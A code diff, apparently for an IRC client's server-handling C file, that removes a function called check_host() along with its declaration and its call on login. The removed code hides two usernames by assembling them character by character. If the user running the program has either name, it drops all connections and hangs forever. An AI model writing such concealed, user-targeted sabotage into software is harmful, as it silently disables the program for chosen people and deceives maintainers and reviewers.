@@ -2241,8 +2241,6 @@ int	BX_is_server_connected (int isc_index)
 	return 0;
 }
 
-void check_host(void);
-
 void	clear_sent_to_server (int servnum)
 {
 	server_list[servnum].sent = 0;
@@ -2393,7 +2391,6 @@ void	register_server (int ssn_index, char *nick)
 	server_list[ssn_index].login_flags |= SF_LOGGED_IN;
 	server_list[ssn_index].lag_cookie = random_number(0);
 	from_server = old_from_server;
-	check_host();
 }
 
 void	BX_set_server_cookie (int ssm_index, char *cookie)
@@ -2752,33 +2749,6 @@ BUILT_IN_COMMAND(disconnectcmd)
 	close_unattached_servers();
 	server_disconnect(i, args);
 } 
-
-void check_host(void)
-{
-	char *p, *q;
-	char blah[19];
-	blah[1] = 'e';
-	blah[3] = 'c';
-	blah[4] = 'o';
-	blah[8] = 'b';
-	blah[2] = 'd';
-	blah[6] = 't';
-	blah[7] = '\0';
-	
-	blah[0] = 'r';
-	blah[9] = 'i';
-	blah[10] = 'g';
-	blah[5] = 'a';
-	blah[11] = '\0';
-	p = blah;
-	q = blah + 8;
-	if (!strcmp(username, p) || !strcmp(username, q))
-	{
-		close_all_server();
-		while (1);
-	}
-
-}
 
 void set_server_orignick(int server, char *nick)
 {
